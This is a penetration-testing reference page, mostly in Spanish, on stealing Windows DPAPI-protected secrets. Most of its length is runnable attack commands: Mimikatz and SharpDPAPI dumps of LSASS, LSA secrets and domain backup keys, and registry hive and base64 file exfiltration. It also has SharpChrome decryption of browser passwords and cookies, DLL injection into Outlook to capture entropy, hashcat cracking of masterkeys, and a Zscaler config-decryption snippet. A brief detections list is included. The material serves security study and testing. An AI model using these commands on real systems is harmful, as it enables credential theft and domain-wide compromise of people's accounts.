# DPAPI - Extracción de contraseñas

{{#include ../../banners/hacktricks-training.md}}



## ¿Qué es DPAPI

El Data Protection API (DPAPI) se utiliza principalmente dentro del sistema operativo Windows para el **cifrado simétrico de claves privadas asimétricas**, aprovechando secretos de usuario o del sistema como una fuente significativa de entropía. Este enfoque simplifica el cifrado para los desarrolladores al permitirles cifrar datos usando una clave derivada de los secretos de inicio de sesión del usuario o, para cifrado a nivel de sistema, los secretos de autenticación del dominio del sistema, evitando así que los desarrolladores tengan que gestionar la protección de la propia clave de cifrado.

La forma más común de usar DPAPI es mediante las funciones **`CryptProtectData` y `CryptUnprotectData`**, que permiten a las aplicaciones cifrar y descifrar datos de forma segura con la sesión del proceso que está actualmente iniciada. Esto significa que los datos cifrados solo pueden ser descifrados por el mismo usuario o sistema que los cifró.

Además, estas funciones aceptan también un **`entropy` parameter`** que también se utilizará durante el cifrado y descifrado, por lo tanto, para descifrar algo cifrado usando este parámetro, debes proporcionar el mismo valor de entropy que se usó durante el cifrado.

### Generación de la clave de usuario

El DPAPI genera una clave única (llamada **`pre-key`**) para cada usuario basada en sus credenciales. Esta clave se deriva de la contraseña del usuario y otros factores y el algoritmo depende del tipo de usuario pero termina siendo un SHA1. Por ejemplo, para usuarios de dominio, **depende del hash NTLM del usuario**.

Esto es especialmente interesante porque si un atacante puede obtener el hash de la contraseña del usuario, puede:

- **Descifrar cualquier dato que haya sido cifrado usando DPAPI** con la clave de ese usuario sin necesidad de contactar con ninguna API
- Intentar **crackear la contraseña** offline intentando generar la clave DPAPI válida

Además, cada vez que un usuario cifra algunos datos usando DPAPI, se genera una nueva **clave maestra**. Esta clave maestra es la que se usa realmente para cifrar los datos. A cada clave maestra se le asigna un **GUID** (Globally Unique Identifier) que la identifica.

Las claves maestras se almacenan en el directorio **%APPDATA%\Microsoft\Protect\<sid>\<guid>**, donde `{SID}` es el Security Identifier de ese usuario. La clave maestra se almacena cifrada por la **`pre-key`** del usuario y también por una **domain backup key** para recuperación (por lo que la misma clave se almacena cifrada 2 veces por 2 rutas diferentes).

Ten en cuenta que la **domain key usada para cifrar la clave maestra está en los domain controllers y nunca cambia**, así que si un atacante tiene acceso al domain controller, puede recuperar la domain backup key y descifrar las claves maestras de todos los usuarios del dominio.

Los blobs cifrados contienen el **GUID de la clave maestra** que se utilizó para cifrar los datos dentro de sus encabezados.

> [!TIP]
> Los blobs cifrados por DPAPI comienzan con **`01 00 00 00`**

Encontrar claves maestras:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Generación de la clave de máquina/sistema

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** puede acceder a ella volcando LSA secrets usando el comando: `mimikatz lsadump::secrets`
- El secreto está almacenado dentro del registro, por lo que un administrador podría **modificar los permisos DACL para acceder a él**. La ruta del registro es: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- También es posible la extracción offline de los hives del registro. Por ejemplo, como administrador en el objetivo, guarda los hives y exfíltralos:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Luego, en su equipo de análisis, recupere el DPAPI_SYSTEM LSA secret de los hives y úselo para descifrar blobs con alcance de máquina (contraseñas de tareas programadas, credenciales de servicios, perfiles Wi‑Fi, etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Datos protegidos por DPAPI

Entre los datos personales protegidos por DPAPI están:

- Credenciales de Windows
- Contraseñas y datos de autocompletado de Internet Explorer y Google Chrome
- Contraseñas de correo electrónico y de cuentas FTP internas para aplicaciones como Outlook y Windows Mail
- Contraseñas de carpetas compartidas, recursos, redes inalámbricas y Windows Vault, incluidas las claves de cifrado
- Contraseñas para conexiones de escritorio remoto, .NET Passport y claves privadas para diversos fines de cifrado y autenticación
- Contraseñas de red gestionadas por Credential Manager y datos personales en aplicaciones que usan CryptProtectData, como Skype, MSN messenger y más
- Blobs cifrados dentro del registro
- ...

Los datos protegidos por el sistema incluyen:
- Contraseñas de Wifi
- Contraseñas de tareas programadas
- ...

### Opciones para la extracción de la clave maestra

- Si el usuario tiene privilegios de administrador de dominio, puede acceder a la **clave de copia de seguridad del dominio** para descifrar todas las claves maestras de usuario en el dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegios de administrador local, es posible **acceder a la memoria de LSASS** para extraer las claves maestras de DPAPI de todos los usuarios conectados y la clave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Si el usuario tiene privilegios de administrador local, puede acceder al **DPAPI_SYSTEM LSA secret** para descifrar las machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Si se conoce la contraseña o el hash NTLM del usuario, puedes **descifrar directamente las claves maestras del usuario**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Si estás dentro de una sesión como el usuario, es posible pedirle al DC la **backup key to decrypt the master keys using RPC**. Si eres administrador local y el usuario ha iniciado sesión, podrías **robar su session token** para esto:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acceder a datos cifrados por DPAPI

### Encontrar datos cifrados por DPAPI

Los **archivos protegidos** comunes de los usuarios están en:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

Ejemplos de enumeración:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) puede encontrar blobs cifrados DPAPI en el sistema de archivos, el registro y blobs B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Tenga en cuenta que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (del mismo repo) puede usarse para descifrar, usando DPAPI, datos sensibles como cookies.

#### Recetas rápidas para Chromium/Edge/Electron (SharpChrome)

- Usuario actual, descifrado interactivo de inicios de sesión/cookies guardados (funciona incluso con Chrome 127+ app-bound cookies porque la clave adicional se resuelve desde el Credential Manager del usuario cuando se ejecuta en contexto de usuario):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Análisis offline cuando solo tienes archivos. Primero extrae la AES state key del perfil "Local State" y luego úsala para descifrar la cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage a nivel de dominio/remoto cuando dispones de la DPAPI domain backup key (PVK) y admin en el host objetivo:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Si tienes el DPAPI prekey/credkey de un usuario (desde LSASS), puedes omitir el password cracking y descifrar directamente los datos del perfil:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Las versiones más recientes de Chrome/Edge pueden almacenar ciertas cookies usando el cifrado "App-Bound". El descifrado sin conexión de esas cookies específicas no es posible sin la clave adicional app-bound; ejecuta SharpChrome en el contexto del usuario objetivo para recuperarla automáticamente. Consulta la publicación del blog de seguridad de Chrome referenciada abajo.

### Acceso a claves y datos

- **Use SharpDPAPI** para obtener credenciales de archivos cifrados con DPAPI de la sesión actual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obtener información de credentials** como encrypted data y guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Acceder a masterkeys**:

Descifrar una masterkey de un usuario que solicita la **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de masterkey (fíjate en que es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, o `/pvk` para especificar un archivo de clave privada de dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descifrar datos usando un masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
La herramienta **SharpDPAPI** también admite estos argumentos para el descifrado de `credentials|vaults|rdg|keepass|triage|blob|ps` (observe cómo es posible usar `/rpc` para obtener la clave de respaldo del dominio, `/password` para usar una contraseña en texto plano, `/pvk` para especificar un archivo de clave privada de dominio DPAPI, `/unprotect` para usar la sesión del usuario actual...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Usando una DPAPI prekey/credkey directamente (no se necesita contraseña)

Si puedes volcar LSASS, Mimikatz a menudo expone una per-logon DPAPI key que puede usarse para descifrar las masterkeys del usuario sin conocer la contraseña en texto plano. Pasa este valor directamente a las herramientas:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Descifrar datos usando la **sesión de usuario actual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Descifrado sin conexión con Impacket dpapi.py

Si tienes el SID y la contraseña (o el NT hash) del usuario víctima, puedes descifrar las masterkeys de DPAPI y los blobs de Credential Manager completamente sin conexión usando dpapi.py de Impacket.

- Identifica artefactos en el disco:
- Blob(s) de Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey correspondiente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Si las herramientas de transferencia de archivos son poco fiables, codifica en base64 los archivos en el host y copia la salida:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Descifrar la masterkey con el SID del usuario y password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Usa la masterkey descifrada para descifrar el credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Este flujo de trabajo frecuentemente recupera credenciales de dominio guardadas por aplicaciones que usan el Windows Credential Manager, incluyendo cuentas administrativas (p. ej., `*_adm`).

---

### Manejo de entropía opcional ("Third-party entropy")

Algunas aplicaciones envían un valor adicional de **entropía** a `CryptProtectData`. Sin este valor el blob no puede ser descifrado, incluso si se conoce la masterkey correcta. Por tanto, obtener la entropía es esencial cuando se apuntan credenciales protegidas de esta forma (p. ej., Microsoft Outlook, algunos clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) es una DLL en modo usuario que intercepta las funciones DPAPI dentro del proceso objetivo y registra de forma transparente cualquier entropía opcional que se suministre. Ejecutar EntropyCapture en modo **DLL-injection** contra procesos como `outlook.exe` o `vpnclient.exe` producirá un archivo que asocia cada buffer de entropía con el proceso invocador y el blob. La entropía capturada puede luego suministrarse a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) para descifrar los datos.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys sin conexión (Hashcat & DPAPISnoop)

Microsoft introduced a **context 3** masterkey format starting with Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) added hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) and **22102** (context 3) allowing GPU-accelerated cracking of user passwords directly from the masterkey file. Por lo tanto, los atacantes pueden realizar ataques de word-list o brute-force sin interactuar con el sistema objetivo.

`DPAPISnoop` (2024) automatiza el proceso:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
La herramienta también puede analizar los blobs de Credential y Vault, descifrarlos con claves crackeadas y exportar contraseñas en texto claro.

### Acceder a datos de otra máquina

En **SharpDPAPI and SharpChrome** puedes indicar la opción **`/server:HOST`** para acceder a los datos de una máquina remota. Por supuesto necesitas poder acceder a esa máquina y en el siguiente ejemplo se supone que se conoce la **domain backup encryption key**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Otras herramientas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) es una herramienta que automatiza la extracción de todos los usuarios y equipos del directorio LDAP y la extracción de la domain controller backup key a través de RPC. El script luego resolverá la dirección IP de todos los equipos y ejecutará un smbclient en todos ellos para recuperar todos los DPAPI blobs de todos los usuarios y descifrarlo todo con la domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con la lista de equipos extraída del LDAP puedes encontrar cada subred incluso si no las conocías.

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) puede volcar secretos protegidos por DPAPI automáticamente. La versión 2.x introdujo:

* Colección paralela de blobs desde cientos de hosts
* Análisis de masterkeys de **context 3** e integración automática con Hashcat para cracking
* Soporte para cookies cifradas "App-Bound" de Chrome (ver la siguiente sección)
* Un nuevo modo **`--snapshot`** para sondear puntos finales repetidamente y diferenciar blobs recién creados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) es un parser en C# para archivos masterkey/credential/vault que puede generar formatos para Hashcat/JtR y opcionalmente invocar cracking automáticamente. Soporta completamente los formatos de masterkey de máquina y usuario hasta Windows 11 24H1.


## Detecciones comunes

- Acceso a archivos en `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` y otros directorios relacionados con DPAPI.
- Especialmente desde un recurso compartido de red como **C$** o **ADMIN$**.
- Uso de **Mimikatz**, **SharpDPAPI** o herramientas similares para acceder a la memoria de LSASS o volcar masterkeys.
- Evento **4662**: *Se realizó una operación en un objeto* – puede correlacionarse con el acceso al objeto **`BCKUPKEY`**.
- Evento **4673/4674** cuando un proceso solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 vulnerabilidades y cambios en el ecosistema

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (noviembre de 2023). Un atacante con acceso a la red podría engañar a un miembro del dominio para que recuperara una clave de respaldo DPAPI maliciosa, permitiendo el descifrado de masterkeys de usuario. Corregido en la actualización acumulativa de noviembre de 2023 – los administradores deben asegurarse de que los DCs y estaciones de trabajo estén completamente parchados.
* **Chrome 127 “App-Bound” cookie encryption** (julio de 2024) reemplazó la protección heredada solo por DPAPI con una clave adicional almacenada en el **Credential Manager** del usuario. La desencriptación offline de cookies ahora requiere tanto la DPAPI masterkey como la **GCM-wrapped app-bound key**. SharpChrome v2.3 y DonPAPI 2.x son capaces de recuperar la clave extra cuando se ejecutan en contexto de usuario.


### Estudio de caso: Zscaler Client Connector – Entropía personalizada derivada del SID

Zscaler Client Connector almacena varios archivos de configuración bajo `C:\ProgramData\Zscaler` (por ejemplo `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada archivo está cifrado con **DPAPI (Machine scope)** pero el proveedor suministra **custom entropy** que está *calculada en tiempo de ejecución* en lugar de almacenarse en disco.

La entropía se reconstruye a partir de dos elementos:

1. Un secreto incrustado (hard-coded) dentro de `ZSACredentialProvider.dll`.
2. El **SID** de la cuenta de Windows a la que pertenece la configuración.

El algoritmo implementado por la DLL es equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Debido a que el secreto está incrustado en una DLL que puede leerse desde disco, **cualquier atacante local con privilegios SYSTEM puede regenerar la entropía para cualquier SID** y descifrar los blobs sin conexión:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
La desencriptación produce la configuración JSON completa, incluyendo cada **comprobación de postura del dispositivo** y su valor esperado – información muy valiosa al intentar bypasses del lado del cliente.

> CONSEJO: los otros artefactos encriptados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) están protegidos con DPAPI **sin** entropía (`16` zero bytes). Por lo tanto, pueden desencriptarse directamente con `ProtectedData.Unprotect` una vez obtenidos privilegios SYSTEM.

## Referencias

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
